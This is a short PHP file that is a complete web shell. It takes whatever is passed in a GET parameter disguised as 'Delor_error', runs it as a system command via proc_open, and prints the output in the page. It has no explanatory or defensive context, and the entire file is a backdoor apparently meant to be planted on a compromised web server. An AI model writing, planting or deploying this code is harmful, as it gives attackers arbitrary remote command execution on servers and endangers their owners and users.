<?php
if (isset($_GET['Delor_error'])) {
    $command = $_GET['Delor_error'];
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $process = proc_open($command, $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        echo "<pre>$output</pre>";
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}
?>
